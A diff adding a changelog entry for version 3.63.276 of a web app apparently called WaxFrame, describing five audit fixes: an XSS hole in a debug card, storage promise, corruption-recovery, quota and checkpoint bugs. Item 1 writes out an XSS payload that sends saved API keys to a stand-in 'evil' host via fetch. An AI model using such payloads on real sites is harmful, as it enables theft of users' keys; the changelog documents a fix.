@@ -2,6 +2,40 @@
 
 ---
 
+## v3.63.276
+
+**CRITICAL correctness sweep — five storage- and security-layer fixes from the deep audit**
+
+Build: `20260611-003`<br>
+Released: `2026-06-11`
+
+### What changed
+
+Five independent CRITICAL items found during the deep audit, all in the trust path between the user and persistence. Patched together because they share a single mental model — "what happens when something goes wrong" — and four of the five are storage-layer.
+
+**1. XSS in the Troubleshooting Card link builder (`js/wf-debug.js`).** The escape applied to provider error messages covered `& < >` but not `" '`. The linkifier regex matched `https?://[^\s<]+` — note the absence of `"` in the character class — and dropped the captured substring straight into a `href="${url}"` attribute. A custom AI returning `{"error":{"message":"see https://x.com\" onerror=\"fetch('https://evil/'+localStorage.getItem('waxframe_v2_hive'))"}}` would break out of the attribute and execute arbitrary JS in the WaxFrame origin — full access to every saved API key, the license key, the IDB session, the lot. Fix: full HTML-attribute-safe escape (`" '` added) and tightened the URL regex to exclude `"` as well, so the path is closed both at the source and at the sink.
+
+**2. `saveSession()` returned `undefined` (`js/storage.js`).** The function chained writes through `_saveSessionChain.then(...)` for serialization but never returned the chain. `await saveSession()` therefore resolved instantly while the actual write was still in flight. `_writeCheckpoint`'s `await saveSession({force:true}); await idbGet()` pattern — meant to flush in-memory state to IDB before snapshotting — could read the previous snapshot, so a Save Checkpoint taken right after a doc edit could miss the edit. Fix: `return _saveSessionChain;` at the end of the function. One-line, no behavioral change anywhere else (callers that didn't `await` continue to work).
+
+**3. `loadSettings()` silently destroyed the hive on a single corrupt byte (`js/storage.js`).** The function was wrapped in a function-level try/catch, with `aiList = JSON.parse(JSON.stringify(DEFAULT_AIS))` assigned BEFORE the parse of LS_HIVE. A throw on the parse landed in the broad catch, returned `false`, but `aiList` had already been wiped to defaults. The DOMContentLoaded caller ignored the return value, the setup-grid render fired a save, and the recoverable blob was overwritten with the defaults. Permanent silent data loss from one bad byte. Fix: narrow the try around just the `JSON.parse` call, stash the raw bytes to a `waxframe_v2_hive_recovery` localStorage key BEFORE bailing, raise a long-duration toast warning the user not to click Save Settings until they inspect the recovery key, and return false without ever touching `aiList`.
+
+**4. LocalStorage-fallback quota failure silently dropped rounds (`js/storage.js` + `js/app.js`).** When IDB threw, `saveSession`'s fallback stuffed the entire session payload (history + docText + consoleHTML + ringBuffer) into one `localStorage.setItem` — and the 5 MB localStorage cap hit immediately for any non-trivial session. The original code logged to the live console and added an inline "Export Now" button, but did NOT halt the round flow. The user kept clicking Smoke the Hive, the UI showed green "round complete" feedback, and nothing was being persisted. They found out on reload. Fix: when the LS fallback hits `QuotaExceededError`, set `window._persistenceBroken = true`, pin a high-contrast red sticky banner at the top of the viewport, AND halt `runRound` / `runBuilderOnly` at the entry point until a successful save clears the flag. The user now CAN'T spend more API budget against broken persistence. The banner has an inline Export button and stays visible until either the user exports and clears storage, or a save succeeds.
+
+**5. Checkpoint envelope was missing three round-state localStorage keys (`js/storage.js`).** The Save Checkpoint scope expanded `session` into `LS_SESSION + IDB_SESSION`, but `waxframe_resolved_decisions`, `waxframe_conflict_ledger`, and `waxframe_ai_warnings` — the conflict-resolution state machine and per-AI warnings that survive across rounds — lived in their own localStorage keys and weren't bundled in. Save Checkpoint → Restore silently lost the decision history and the Builder re-raised already-resolved conflicts; the "repeat offender" detection reset to zero. Fix: bundle the three keys into a new `LS_ROUND_STATE` envelope field, gated by the same `session` scope toggle. `_writeCheckpoint` captures them when present, `_applyCheckpoint` restores them, and an older v6 checkpoint (no `LS_ROUND_STATE`) restores cleanly with the existing fields plus a silent skip. Bumped envelope version to 7 to mark the schema additive change.
+
+### Why this matters
+
+Items 2, 3, 4 are the kind of bug that doesn't surface until the long tail: 2 means a power user with rapid checkpoint-and-edit loops sees a "missed last keystroke" feeling that's hard to repro; 3 means a single bad-byte LocalStorage entry (browser eviction race, extension interference, anything) permanently swaps the user's configured hive for the defaults; 4 means anyone who actually hits the quota wall (large transcripts, long-running sessions) discovers it on reload after they've spent more API money. Item 1 is the only one with a clean exploit path, but it cleans out everything — keys + license + state in one go. Item 5 silently degrades the Builder's conflict-handling intelligence after every checkpoint restore.
+
+### Files touched
+
+- [js/wf-debug.js](js/wf-debug.js) — Troubleshooting Card escape extended to `" '`; URL regex tightened to exclude `"`
+- [js/storage.js](js/storage.js) — `saveSession` returns `_saveSessionChain`; `loadSettings` narrowed try + recovery stash; LS-fallback QuotaExceeded pins sticky banner + sets `_persistenceBroken` flag; checkpoint envelope adds `LS_ROUND_STATE` with the three round-state localStorage keys
+- [js/app.js](js/app.js) — `runRound` and `runBuilderOnly` guard on `window._persistenceBroken` at entry
+- [style.css](style.css) — new `.persistence-broken-banner` rules (fixed-position red banner with inline Export button)
+
+---
+
 ## v3.63.275
 
 **Audit cleanup pass — three CRITICAL findings patched, release-check guard tightened**
